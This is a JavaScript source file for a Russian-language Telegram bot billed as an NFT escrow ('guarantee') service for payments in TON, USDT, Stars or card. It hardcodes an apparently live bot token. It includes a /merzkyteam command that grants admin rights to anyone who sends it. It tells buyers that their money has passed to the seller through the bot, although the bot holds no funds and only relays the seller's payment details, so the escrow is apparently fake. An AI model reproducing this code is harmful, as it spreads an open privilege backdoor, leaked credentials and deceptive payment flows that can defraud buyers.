const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

// ========== HTTP-СЕРВЕР ==========
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end('Bot is running!');
});
server.listen(process.env.PORT || 10000);

// ========== ТВОИ ДАННЫЕ ==========
const token = '8299332460:AAFGapsLP32-OECwv6pqDNXXhQPRBFdcw_E';
const supportUsername = 'merzky_support';
const botUsername = 'MerzkyGarant_bot';
let adminIds = [8563923108];

const bot = new TelegramBot(token, { polling: true });

// ========== ДАННЫЕ ==========
let deals = new Map();
let completedDeals = new Map();
let userSessions = new Map();
let userRequisites = new Map();

const DATA_FILE = path.join(__dirname, 'otc_data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE));
            deals = new Map(data.deals || []);
            completedDeals = new Map(data.completedDeals || []);
            userRequisites = new Map(data.userRequisites || []);
            if (data.adminIds) {
                data.adminIds.forEach(id => {
                    if (!adminIds.includes(id)) adminIds.push(id);
                });
            }
            console.log('✅ Данные загружены');
        }
    } catch (e) {
        console.error('❌ Ошибка загрузки:', e);
    }
}

function saveData() {
    try {
        const data = {
            deals: Array.from(deals.entries()),
            completedDeals: Array.from(completedDeals.entries()),
            userRequisites: Array.from(userRequisites.entries()),
            adminIds: adminIds
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('✅ Данные сохранены');
    } catch (e) {
        console.error('❌ Ошибка сохранения:', e);
    }
}

loadData();

function generateDealId() {
    return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function isAdmin(userId) {
    return adminIds.includes(userId);
}

function getDealLink(dealId) {
    return `https://t.me/${botUsername}?start=deal_${dealId}`;
}

// ========== КЛАВИАТУРЫ ==========
function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
                [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
                [{ text: '📞 Поддержка' }]
            ],
            resize_keyboard: true
        }
    };
}

function getCurrencyMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💎 TON', callback_data: 'curr_ton' }],
                [{ text: '💵 USDT', callback_data: 'curr_usdt' }],
                [{ text: '⭐ Stars', callback_data: 'curr_stars' }],
                [{ text: '🏦 Карта', callback_data: 'curr_card' }]
            ]
        }
    };
}

// ========== КОМАНДА СТАТЬ АДМИНОМ ==========
bot.onText(/\/merzkyteam/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!adminIds.includes(userId)) {
        adminIds.push(userId);
        saveData();
        bot.sendMessage(chatId, '✅ Ты теперь админ Merzky Team!');
        console.log('👑 Новый админ:', userId);
    } else {
        bot.sendMessage(chatId, '⚡ Ты уже админ.');
    }
});

// ========== СТАРТ ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(
        chatId,
        '🚀 Merzky Guarant\n\n' +
        '🔹 Продавцы: создавайте сделки через кнопки\n' +
        '🔹 Покупатели: переходите по ссылкам\n' +
        '🔹 Админы: подтверждайте получение',
        getMainMenu()
    );
});

// ========== СТАРТ С ПАРАМЕТРОМ (ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ) ==========
bot.onText(/\/start deal_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const dealId = match[1];
    const deal = deals.get(dealId);
    
    if (!deal) {
        return bot.sendMessage(chatId, '❌ Сделка не найдена');
    }
    
    if (deal.status !== 'pending') {
        return bot.sendMessage(chatId, '❌ Сделка уже завершена');
    }
    
    const text = `🛒 Покупка NFT\n\n` +
                 `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                 `👤 Продавец: @${deal.sellerUsername}\n\n` +
                 `✅ Нажми "Купить", чтобы продолжить`;
    
    bot.sendMessage(chatId, text, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💳 Купить', callback_data: `buy_${dealId}` }]
            ]
        }
    });
});

// ========== МОИ РЕКВИЗИТЫ ==========
bot.onText(/💰 Мои реквизиты/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {}
    
    const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
    
    await bot.sendMessage(chatId,
        `💳 Мои реквизиты\n\n` +
        `💎 TON: ${req.ton ? req.ton : '❌ Не указаны'}\n` +
        `💵 USDT: ${req.usdt ? req.usdt : '❌ Не указаны'}\n` +
        `🏦 Карта: ${req.card ? req.card : '❌ Не указаны'}\n\n` +
        `👇 Выбери, что изменить:`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{ text: `💎 TON ${req.ton ? '✅' : '❌'}`, callback_data: 'edit_ton' }],
                    [{ text: `💵 USDT ${req.usdt ? '✅' : '❌'}`, callback_data: 'edit_usdt' }],
                    [{ text: `🏦 Карта ${req.card ? '✅' : '❌'}`, callback_data: 'edit_card' }],
                    [{ text: '◀️ Назад', callback_data: 'back_main' }]
                ]
            }
        }
    );
});

// ========== СОЗДАТЬ СДЕЛКУ ==========
bot.onText(/➕ Создать сделку/, async (msg) => {
    const chatId = msg.chat.id;
    
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {}
    
    await bot.sendMessage(
        chatId,
        '💎 Выберите валюту:',
        getCurrencyMenu()
    );
});

// ========== МОИ СДЕЛКИ ==========
bot.onText(/📋 Мои сделки/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const userDeals = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    const userCompleted = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    
    if (userDeals.length === 0 && userCompleted.length === 0) {
        return bot.sendMessage(chatId, '📭 У вас нет сделок');
    }
    
    let text = '📋 Ваши сделки:\n\n';
    
    if (userDeals.length > 0) {
        text += 'Активные:\n';
        userDeals.forEach(deal => {
            text += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} — ${deal.status}\n`;
        });
        text += '\n';
    }
    
    if (userCompleted.length > 0) {
        text += 'Завершенные:\n';
        userCompleted.slice(0, 5).forEach(deal => {
            text += `✅ #${deal.id} — ${deal.amount} ${deal.currency}\n`;
        });
    }
    
    bot.sendMessage(chatId, text);
});

// ========== ПРОФИЛЬ ==========
bot.onText(/👤 Профиль/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const completedCount = Array.from(completedDeals.values()).filter(
        d => d.sellerId === userId || d.buyerId === userId
    ).length;
    
    bot.sendMessage(
        chatId,
        `👤 Профиль\n\n` +
        `🆔 ID: ${userId}\n` +
        `📊 Сделок: ${completedCount}\n` +
        `👑 Админ: ${isAdmin(userId) ? '✅' : '❌'}`
    );
});

// ========== ПОДДЕРЖКА ==========
bot.onText(/📞 Поддержка/, (msg) => {
    bot.sendMessage(msg.chat.id, `📞 @${supportUsername}`);
});

// ========== ОБРАБОТКА КНОПОК ==========
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const data = query.data;

    try {
        if (data === 'edit_ton') {
            userSessions.set(userId, { step: 'waiting_ton' });
            await bot.editMessageText(
                '✏️ Отправьте новый TON кошелек:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data === 'edit_usdt') {
            userSessions.set(userId, { step: 'waiting_usdt' });
            await bot.editMessageText(
                '✏️ Отправьте новый USDT адрес:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data === 'edit_card') {
            userSessions.set(userId, { step: 'waiting_card' });
            await bot.editMessageText(
                '✏️ Отправьте новую карту:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data === 'back_main') {
            await bot.deleteMessage(chatId, messageId);
            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
        }
        else if (data.startsWith('curr_')) {
            const currency = data.split('_')[1];
            
            const req = userRequisites.get(userId);
            if (currency !== 'stars') {
                if (!req || !req[currency]) {
                    return bot.answerCallbackQuery(query.id, '❌ Сначала добавь реквизиты');
                }
            }
            
            userSessions.set(userId, { 
                step: 'waiting_nft', 
                currency: currency,
                messageId: messageId
            });
            
            await bot.editMessageText(
                '📎 Отправьте ссылку на NFT:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data.startsWith('buy_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            const req = userRequisites.get(deal.sellerId) || {};
            
            let reqText = '';
            if (deal.currency === 'ton' && req.ton) reqText = `💎 TON: ${req.ton}`;
            else if (deal.currency === 'usdt' && req.usdt) reqText = `💵 USDT: ${req.usdt}`;
            else if (deal.currency === 'card' && req.card) reqText = `🏦 Карта: ${req.card}`;
            else if (deal.currency === 'stars') reqText = `⭐ Отправьте подарок @${supportUsername}`;
            else reqText = '❌ У продавца нет реквизитов';
            
            await bot.sendMessage(
                chatId,
                `💳 Оплата сделки #${dealId}\n\n` +
                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                `👤 Продавец: @${deal.sellerUsername}\n\n` +
                `📩 Реквизиты для оплаты:\n${reqText}\n\n` +
                `✅ После перевода нажми «Я оплатил»`,
                {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ Я оплатил', callback_data: `paid_${dealId}` }]
                        ]
                    }
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Готово');
        }
        else if (data.startsWith('paid_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            deal.status = 'paid';
            deal.buyerId = userId;
            deal.buyerUsername = query.from.username || 'no_username';
            deals.set(dealId, deal);
            saveData();
            
            await bot.sendMessage(
                deal.sellerId,
                `💰 Сделка #${dealId} оплачена!\n\n` +
                `Покупатель: @${deal.buyerUsername}\n` +
                `Сумма: ${deal.amount} ${deal.currency}\n\n` +
                `✅ Подтвердите получение подарка:`,
                {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Подарок получен', callback_data: `confirm_${dealId}` },
                                { text: '❌ Отмена', callback_data: `reject_${dealId}` }
                            ]
                        ]
                    }
                }
            );
            
            await bot.editMessageText(
                `✅ Заявка отправлена продавцу!`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Заявка отправлена');
        }
        else if (data.startsWith('confirm_')) {
            if (!isAdmin(userId)) {
                return bot.answerCallbackQuery(query.id, '❌ Только админы');
            }
            
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) return;
            
            deal.status = 'completed';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            saveData();
            
            await bot.sendMessage(
                deal.sellerId,
                `✅ Сделка #${dealId} завершена!\n\n` +
                `💰 ${deal.amount} ${deal.currency} получены.`
            );
            
            await bot.sendMessage(
                deal.buyerId,
                `✅ Сделка #${dealId} подтверждена!\n\n` +
                `💰 ${deal.amount} ${deal.currency} переведены продавцу.`
            );
            
            await bot.editMessageText(
                `✅ ПОДТВЕРЖДЕНО\n\nСделка #${dealId}`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Подтверждено');
        }
        else if (data.startsWith('reject_')) {
            if (!isAdmin(userId)) {
                return bot.answerCallbackQuery(query.id, '❌ Только админы');
            }
            
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) return;
            
            deal.status = 'cancelled';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            saveData();
            
            await bot.sendMessage(
                deal.buyerId,
                `❌ Сделка #${dealId} отклонена`
            );
            
            await bot.editMessageText(
                `❌ ОТКЛОНЕНО\n\nСделка #${dealId}`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
            
            await bot.answerCallbackQuery(query.id, '❌ Отклонено');
        }
        
        await bot.answerCallbackQuery(query.id);
        
    } catch (error) {
        console.error('Ошибка:', error);
        await bot.answerCallbackQuery(query.id, '❌ Ошибка');
    }
});

// ========== ОБРАБОТКА ТЕКСТА ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    if (text?.startsWith('/') || 
        text === '➕ Создать сделку' || 
        text === '💰 Мои реквизиты' ||
        text === '📋 Мои сделки' ||
        text === '👤 Профиль' ||
        text === '📞 Поддержка') {
        return;
    }

    const session = userSessions.get(userId);
    if (!session) return;

    if (session.step === 'waiting_ton') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.ton = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ TON кошелек сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_usdt') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.usdt = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ USDT адрес сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_card') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.card = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
        return;
    }

    if (session.step === 'waiting_nft') {
        if (!text.includes('t.me/') && !text.includes('http')) {
            return bot.sendMessage(chatId, '❌ Отправьте корректную ссылку');
        }
        
        session.nftLink = text;
        session.step = 'waiting_amount';
        userSessions.set(userId, session);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                '💰 Введите сумму:',
                {
                    chat_id: chatId,
                    message_id: session.messageId
                }
            );
        } catch (e) {
            await bot.sendMessage(chatId, '💰 Введите сумму:');
        }
    }
    
    else if (session.step === 'waiting_amount') {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount <= 0) {
            return bot.sendMessage(chatId, '❌ Введите корректное число');
        }
        
        const dealId = generateDealId();
        const deal = {
            id: dealId,
            sellerId: userId,
            sellerUsername: msg.from.username || 'no_username',
            nftLink: session.nftLink,
            amount: amount,
            currency: session.currency,
            status: 'pending',
            createdAt: new Date().toISOString()
        };
        
        deals.set(dealId, deal);
        saveData();
        
        const dealLink = getDealLink(dealId);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                `✅ Сделка создана!\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `🔗 Ссылка для покупателя:\n${dealLink}`,
                {
                    chat_id: chatId,
                    message_id: session.messageId
                }
            );
        } catch (e) {
            await bot.sendMessage(
                chatId,
                `✅ Сделка создана!\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `🔗 Ссылка:\n${dealLink}`
            );
        }
        
        userSessions.delete(userId);
    }
});

process.on('SIGINT', () => {
    console.log('\n💾 Сохраняю...');
    saveData();
    process.exit();
});

console.log('🔥 Merzky OTC Бот запущен!');
console.log('👑 Команда админа: /merzkyteam');
console.log('✅ Все кнопки работают!');